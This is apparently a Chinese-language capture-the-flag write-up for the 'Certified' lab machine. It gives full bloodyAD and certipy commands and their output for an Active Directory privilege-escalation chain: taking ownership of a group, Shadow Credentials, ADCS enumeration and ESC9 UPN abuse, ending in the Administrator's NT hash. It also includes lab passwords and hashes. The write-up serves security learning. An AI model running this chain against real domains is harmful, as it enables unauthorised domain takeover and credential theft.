---
title: Certified
description: 
tags:
  - Modify Owner
  - Shadow Credential
  - Enumerate ADCS
  - ESC9
date: 2026-07-07
---

## BloodHound

因為繞了一圈都沒發現甚麼有價值的入口，所以直接拿題目提供的帳號密碼來 BloodHound 看看。

```
bloodhound-python -u 'judith.mader' -p 'judith09' -d 'certified.htb' -ns '10.129.231.186' -c All --zip
```

發現攻擊路徑：`judith.mader ──WriteOwner──▶ Management(Group) ──GenericWrite──▶ management_svc(User) ──GenericAll──▶ CA_Operator(User)`

## Modify Owner

```bash
# 先把 Management 的 owner 改成 judith.mader
bloodyAD -u judith.mader -p 'judith09' -d certified.htb --host 10.129.231.186 set owner Management judith.mader
# 再把 Management 的 GenericAll 權限給 judith.mader
bloodyAD -u judith.mader -p 'judith09' -d certified.htb --host 10.129.231.186 add genericAll Management judith.mader
# 最後把 judith.mader 加入 Management 群組
bloodyAD -u judith.mader -p 'judith09' -d certified.htb --host 10.129.231.186 add groupMember Management judith.mader
```

## Shadow Credential

judith.mader 加入 Management 後，就可以使用 Shadow Credential 來取得 CA_Operator 的 NTLM hash。所謂 Shadow Credential 是指在 ADCS 中，攻擊者如果有足夠的寫入權限，即可以捏造假的對方憑證植入到 ADCS 中，來取得對方使用者的 NTLM hash，這個功能通常是用來讓使用者可以在沒有密碼的情況下登入系統。

```bash
# 記得時間同步，否則會出現錯誤
sudo timedatectl set-ntp off
sudo net time set -S 10.129.231.186
# shadow credential 取得 management_svc 的 NTLM hash
certipy-ad shadow auto -u judith.mader -p 'judith09' -account management_svc -target certified.htb -dc-ip 10.129.231.186
# shadow credential 取得 ca_operator 的 NTLM hash
certipy-ad shadow auto -u management_svc -hashes a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.129.231.186
# 記得把時間同步復原
sudo timedatectl set-ntp on
```

## Enumerate ADCS

透過向 ADCS 伺服器發出 LDAP 及 RPC 請求查詢，將 ADCS 的設定 dump 出來，並檢查是否有漏洞。

```bash
# 看看有沒有漏洞可以利用
certipy-ad find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout
```

## ESC9

條件有點難懂，反正掃出來有 ESC9 可以利用就對了。

1. 竄改 UPN 為 Administrator
2. 請求 ca_operator(Administrator) 的憑證
3. 透過 management_svc 把 ca_operator 的 UPN 改回去
4. 透過 administrator.pfx(憑證) 取得 Administrator 的 TGT

```bash
# 先把 ca_operator 的 UPN 改成 Administrator
certipy-ad account update -u management_svc -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.129.231.186    
-----------------------------------------------------------------------------
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'

# 請求 ca_operator(Administrator) 的憑證
certipy-ad req -u ca_operator -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.231.186
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 8
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

# 透過 management_svc 把 ca_operator 的 UPN 改回去
certipy-ad account update -u management_svc -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.231.186

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'

# 透過 administrator.pfx(憑證) 取得 Administrator 的 TGT
certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186 
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

## Debug 的部分

查詢 judith 的權限有沒有改正確。

```bash
bloodyAD -u judith.mader -p 'judith09' -d certified.htb --host 10.129.231.186 get object Management --attr nTSecurityDescriptor --resolve-sd | grep -i judith
```